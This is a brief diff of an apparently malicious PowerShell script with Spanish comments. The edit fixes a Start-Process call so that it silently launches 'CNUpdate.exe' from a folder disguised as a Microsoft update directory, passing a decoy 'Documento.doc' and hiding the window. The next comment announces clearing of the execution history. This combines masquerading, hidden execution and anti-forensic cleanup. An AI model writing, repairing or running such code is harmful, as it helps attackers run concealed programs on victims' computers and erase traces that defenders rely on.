@@ -36,7 +36,7 @@ sleep 10
 
 
 ## Execution of the client
-Start-Process -FilePath "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\CNUpdate.exe Documento.doc" -WindowStyle Hidden
+Start-Process -FilePath "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\CNUpdate.exe" -ArgumentList "Documento.doc" -WindowStyle Hidden
 
 sleep 30
 # Limpiar historial de ejecucion
